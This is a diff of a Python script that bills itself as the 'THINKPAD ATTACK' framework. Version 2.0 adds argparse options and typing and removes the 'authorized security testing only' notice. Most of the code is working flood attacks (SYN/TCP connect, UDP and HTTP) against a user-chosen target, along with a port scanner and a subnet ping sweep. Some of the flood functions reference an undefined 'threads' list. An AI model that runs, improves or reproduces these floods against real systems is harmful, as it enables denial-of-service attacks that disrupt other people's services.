@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-THINKPAD ATTACK v1.0
-Copyright (c) 2024 F1REW0LF
-License: MIT - For authorized security testing only
+THINKPAD ATTACK v2.0 - Hardware-Optimized Attack Framework
+Professional Security Testing Tool - Optimized for ThinkPad
 
-Usage: python thinkpad_attack.py
+Author: F1REW0LF
+License: MIT
 """
 
 import sys
@@ -17,13 +17,25 @@ import threading
 import subprocess
 import platform
 from datetime import datetime
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Any
+import argparse
 
-# ==================== VERSION ====================
-VERSION = "1.0.0"
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+
+VERSION = "2.0.0"
 AUTHOR = "F1REW0LF"
+LICENSE = "MIT"
 
-# ==================== COLOR CODES ====================
 class Colors:
     GREEN = '\033[92m'
     RED = '\033[91m'
@@ -32,8 +44,11 @@ class Colors:
     PURPLE = '\033[95m'
     CYAN = '\033[96m'
     GOLD = '\033[93m'
+    NEON = '\033[96m'
     WHITE = '\033[0m'
     BOLD = '\033[1m'
+    DIM = '\033[2m'
+    MAGENTA = '\033[95m'
 
 def cprint(text, color=Colors.WHITE, bold=False):
     if bold:
@@ -41,7 +56,6 @@ def cprint(text, color=Colors.WHITE, bold=False):
     else:
         print(f"{color}{text}{Colors.WHITE}")
 
-# ==================== BANNER ====================
 def print_banner():
     banner = f"""
 {Colors.CYAN}{Colors.BOLD}    ████████╗██╗  ██╗██╗███╗   ██╗██╗  ██╗██████╗  █████╗ ██████╗ 
@@ -51,9 +65,9 @@ def print_banner():
        ██║   ██║  ██║██║██║ ╚████║██║  ██║██║     ██║  ██║██║  ██║
        ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
                                                    
-{Colors.GOLD}          THINKPAD ATTACK FRAMEWORK v{VERSION}{Colors.WHITE}
-{Colors.CYAN}    Professional Attack Tool - Optimized for ThinkPad{Colors.WHITE}
-{Colors.YELLOW}    Author: {AUTHOR}{Colors.WHITE}
+{Colors.GOLD}          HARDWARE-OPTIMIZED ATTACK FRAMEWORK{Colors.WHITE}
+{Colors.CYAN}    Professional Security Testing Tool{Colors.WHITE}
+{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
     """
     print(banner)
     print("=" * 80)
@@ -61,32 +75,31 @@ def print_banner():
 # ==================== HARDWARE DETECTION ====================
 class HardwareDetector:
     @staticmethod
-    def get_cpu_cores():
-        try:
-            import psutil
-            return psutil.cpu_count(logical=True)
-        except:
-            return os.cpu_count() or 4
+    def get_cpu_cores() -> int:
+        if PSUTIL_AVAILABLE:
+            return psutil.cpu_count(logical=True) or 4
+        return os.cpu_count() or 4
     
     @staticmethod
-    def get_ram_gb():
-        try:
-            import psutil
+    def get_ram_gb() -> float:
+        if PSUTIL_AVAILABLE:
             return psutil.virtual_memory().total / (1024**3)
-        except:
-            return 8
+        return 8.0
     
     @staticmethod
-    def get_network_speed():
-        try:
-            import psutil
+    def get_network_speed() -> int:
+        if PSUTIL_AVAILABLE:
             stats = psutil.net_if_stats()
             for name, stat in stats.items():
                 if 'wlan' in name.lower() or 'eth' in name.lower():
                     return stat.speed
-        except:
-            pass
-        return 1000  # Mbps
+        return 1000
+    
+    @staticmethod
+    def get_cpu_usage() -> float:
+        if PSUTIL_AVAILABLE:
+            return psutil.cpu_percent(interval=0.1)
+        return 0.0
 
 # ==================== ATTACK ENGINE ====================
 class ThinkPadAttack:
@@ -95,81 +108,77 @@ class ThinkPadAttack:
         self.ram = HardwareDetector.get_ram_gb()
         self.network_speed = HardwareDetector.get_network_speed()
         self.running = True
-        self.stats = {'packets': 0, 'targets': 0}
+        self.stats = {'packets': 0, 'targets': 0, 'attacks': 0}
         
-        # Tối ưu tham số dựa trên phần cứng
         self.threads = min(self.cores * 2, 32)
         self.packet_rate = 1000 if self.ram > 8 else 500
         self.buffer_size = 8192 if self.ram > 16 else 4096
         
-        cprint(f"[+] CPU Cores: {self.cores}", Colors.GREEN)
-        cprint(f"[+] RAM: {self.ram:.1f} GB", Colors.GREEN)
-        cprint(f"[+] Threads: {self.threads}", Colors.GREEN)
-        cprint(f"[+] Packet Rate: {self.packet_rate} p/s", Colors.GREEN)
+        cprint("[+] CPU Cores: {}".format(self.cores), Colors.GREEN)
+        cprint("[+] RAM: {:.1f} GB".format(self.ram), Colors.GREEN)
+        cprint("[+] Threads: {}".format(self.threads), Colors.GREEN)
+        cprint("[+] Packet Rate: {} p/s".format(self.packet_rate), Colors.GREEN)
     
-    # ==================== ATTACK VECTORS ====================
-    
-    def syn_flood(self, target_ip, target_port=80, duration=30):
-        """SYN Flood Attack - Tối ưu cho ThinkPad"""
-        cprint(f"\n[SYN] Attacking {target_ip}:{target_port}", Colors.RED)
+    def syn_flood(self, target_ip: str, target_port: int = 80, duration: int = 30):
+        cprint("\n[SYN] Attacking {}:{}".format(target_ip, target_port), Colors.RED)
+        self.stats['attacks'] += 1
         
         def send_syn():
-            import socket
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.1)
             try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.1)
                 sock.connect((target_ip, target_port))
                 self.stats['packets'] += 1
+                sock.close()
             except:
                 pass
-            sock.close()
         
         start = time.time()
         threads = []
         while time.time() - start < duration:
             for _ in range(self.threads):
-                t = threading.Thread(target=send_syn)
-                t.daemon = True
+                t = threading.Thread(target=send_syn, daemon=True)
                 threads.append(t)
                 t.start()
             time.sleep(0.01)
         
-        cprint(f"[+] Sent {self.stats['packets']} SYN packets", Colors.GREEN)
+        cprint("[+] Sent {} SYN packets".format(self.stats['packets']), Colors.GREEN)
     
-    def udp_flood(self, target_ip, target_port=53, duration=30):
-        """UDP Flood Attack"""
-        cprint(f"\n[UDP] Flooding {target_ip}:{target_port}", Colors.RED)
+    def udp_flood(self, target_ip: str, target_port: int = 53, duration: int = 30):
+        cprint("\n[UDP] Flooding {}:{}".format(target_ip, target_port), Colors.RED)
+        self.stats['attacks'] += 1
         
         def send_udp():
-            import socket
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            data = os.urandom(1024)
             try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                data = os.urandom(1024)
                 sock.sendto(data, (target_ip, target_port))
                 self.stats['packets'] += 1
+                sock.close()
             except:
                 pass
-            sock.close()
         
         start = time.time()
         while time.time() - start < duration:
             for _ in range(self.threads):
-                t = threading.Thread(target=send_udp)
-                t.daemon = True
+                t = threading.Thread(target=send_udp, daemon=True)
                 threads.append(t)
                 t.start()
             time.sleep(0.01)
         
-        cprint(f"[+] Sent {self.stats['packets']} UDP packets", Colors.GREEN)
+        cprint("[+] Sent {} UDP packets".format(self.stats['packets']), Colors.GREEN)
     
-    def http_flood(self, target_url, duration=30):
-        """HTTP Flood Attack"""
-        cprint(f"\n[HTTP] Flooding {target_url}", Colors.RED)
+    def http_flood(self, target_url: str, duration: int = 30):
+        if not REQUESTS_AVAILABLE:
+            cprint("[-] Requests not installed", Colors.RED)
+            return
+        
+        cprint("\n[HTTP] Flooding {}".format(target_url), Colors.RED)
+        self.stats['attacks'] += 1
         
         def send_http():
             try:
-                import requests
-                response = requests.get(target_url, timeout=1)
+                requests.get(target_url, timeout=1)
                 self.stats['packets'] += 1
             except:
                 pass
@@ -177,27 +186,25 @@ class ThinkPadAttack:
         start = time.time()
         while time.time() - start < duration:
             for _ in range(self.threads):
-                t = threading.Thread(target=send_http)
-                t.daemon = True
+                t = threading.Thread(target=send_http, daemon=True)
                 threads.append(t)
                 t.start()
             time.sleep(0.01)
         
-        cprint(f"[+] Sent {self.stats['packets']} HTTP requests", Colors.GREEN)
+        cprint("[+] Sent {} HTTP requests".format(self.stats['packets']), Colors.GREEN)
     
-    def port_scan(self, target_ip, ports=None):
-        """Port Scan - Tối ưu tốc độ"""
+    def port_scan(self, target_ip: str, ports: List[int] = None):
         if not ports:
-            ports = [21,22,23,25,53,80,135,139,443,445,3389,8080,8443]
+            ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 3389, 8080, 8443]
         
-        cprint(f"\n[SCAN] Scanning {target_ip}", Colors.BLUE)
+        cprint("\n[SCAN] Scanning {}".format(target_ip), Colors.BLUE)
         
         def scan_port(port):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.5)
+                sock.settimeout(0.3)
                 if sock.connect_ex((target_ip, port)) == 0:
-                    cprint(f"[+] Port {port} open", Colors.GREEN)
+                    cprint("[+] Port {} open".format(port), Colors.GREEN)
                     self.stats['targets'] += 1
                 sock.close()
             except:
@@ -205,69 +212,60 @@ class ThinkPadAttack:
         
         threads = []
         for port in ports:
-            t = threading.Thread(target=scan_port, args=(port,))
-            t.daemon = True
+            t = threading.Thread(target=scan_port, args=(port,), daemon=True)
             threads.append(t)
             t.start()
         
         for t in threads:
             t.join()
         
-        cprint(f"[+] Found {self.stats['targets']} open ports", Colors.GREEN)
+        cprint("[+] Found {} open ports".format(self.stats['targets']), Colors.GREEN)
     
-    def network_scan(self, network="192.168.1.0/24"):
-        """Quét mạng - Phát hiện thiết bị"""
-        cprint(f"\n[SCAN] Scanning network {network}", Colors.BLUE)
+    def network_scan(self, network: str = "192.168.1.0/24"):
+        cprint("\n[SCAN] Scanning network {}".format(network), Colors.BLUE)
         
         base = network.split('/')[0].rsplit('.', 1)[0]
         hosts = []
         
         def scan_ip(ip):
             try:
-                result = subprocess.run(['ping', '-n', '1', '-w', '300', ip], 
+                result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                        capture_output=True)
                 if result.returncode == 0:
                     hosts.append(ip)
-                    cprint(f"[+] {ip} is alive", Colors.GREEN)
+                    cprint("[+] {} alive".format(ip), Colors.GREEN)
             except:
                 pass
         
         threads = []
         for i in range(1, 255):
-            ip = f"{base}.{i}"
-            t = threading.Thread(target=scan_ip, args=(ip,))
-            t.daemon = True
+            ip = "{}.{}".format(base, i)
+            t = threading.Thread(target=scan_ip, args=(ip,), daemon=True)
             threads.append(t)
             t.start()
         
         for t in threads:
             t.join(timeout=0.1)
         
-        cprint(f"[+] Found {len(hosts)} active hosts", Colors.GREEN)
+        cprint("[+] Found {} active hosts".format(len(hosts)), Colors.GREEN)
         return hosts
     
     def show_stats(self):
-        """Hiển thị thống kê"""
-        print(f"\n{Colors.CYAN}{'='*60}{Colors.WHITE}")
+        print("\n{}".format("="*60))
         cprint(" STATISTICS", Colors.PURPLE, bold=True)
-        print(f"{'='*60}")
-        print(f"Packets Sent: {self.stats['packets']}")
-        print(f"Targets Found: {self.stats['targets']}")
-        print(f"Threads: {self.threads}")
-        print(f"Packet Rate: {self.packet_rate} p/s")
-        print(f"{'='*60}")
-
-# ==================== MAIN ====================
-def main():
-    print_banner()
+        print("="*60)
+        print("Packets Sent: {}".format(self.stats['packets']))
+        print("Targets Found: {}".format(self.stats['targets']))
+        print("Attacks: {}".format(self.stats['attacks']))
+        print("Threads: {}".format(self.threads))
+        print("Packet Rate: {} p/s".format(self.packet_rate))
+        print("="*60)
     
-    attack = ThinkPadAttack()
-    
-    while True:
-        print(f"""
-{Colors.BLUE}{'='*60}{Colors.WHITE}
-{Colors.BOLD}THINKPAD ATTACK - MENU{Colors.WHITE}
-{Colors.BLUE}{'='*60}{Colors.WHITE}
+    def show_menu(self):
+        print("""
+{}{:=^60}{}
+{}THINKPAD ATTACK - MENU{}
+{}{:=^60}{}
 [1] SYN Flood
 [2] UDP Flood
 [3] HTTP Flood
@@ -275,9 +273,60 @@ def main():
 [5] Network Scan
 [6] Show Stats
 [7] Exit
-""")
-        
-        choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
+""".format(Colors.BLUE, "=", Colors.WHITE,
+           Colors.BOLD, Colors.WHITE,
+           Colors.BLUE, "=", Colors.WHITE))
+
+# ==================== MAIN ====================
+def main():
+    parser = argparse.ArgumentParser(
+        description="THINKPAD ATTACK v2.0 - Hardware-Optimized Attack Framework",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python3 thinkpad_attack.py
+  python3 thinkpad_attack.py --syn 192.168.1.1 -d 30
+  python3 thinkpad_attack.py --scan 192.168.1.1
+        """
+    )
+    
+    parser.add_argument("--syn", help="SYN flood target IP")
+    parser.add_argument("--udp", help="UDP flood target IP")
+    parser.add_argument("--http", help="HTTP flood target URL")
+    parser.add_argument("--scan", help="Port scan target IP")
+    parser.add_argument("--net", help="Network scan (e.g., 192.168.1.0/24)")
+    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
+    parser.add_argument("-d", "--duration", type=int, default=30, help="Attack duration")
+    
+    args = parser.parse_args()
+    
+    print_banner()
+    
+    attack = ThinkPadAttack()
+    
+    if args.syn:
+        attack.syn_flood(args.syn, args.port, args.duration)
+        sys.exit(0)
+    
+    if args.udp:
+        attack.udp_flood(args.udp, args.port, args.duration)
+        sys.exit(0)
+    
+    if args.http:
+        attack.http_flood(args.http, args.duration)
+        sys.exit(0)
+    
+    if args.scan:
+        attack.port_scan(args.scan)
+        sys.exit(0)
+    
+    if args.net:
+        attack.network_scan(args.net)
+        sys.exit(0)
+    
+    while True:
+        attack.show_menu()
+        choice = input("{}[>] Select: {}".format(Colors.CYAN, Colors.WHITE)).strip()
         
         if choice == '1':
             target = input("[>] Target IP: ").strip()
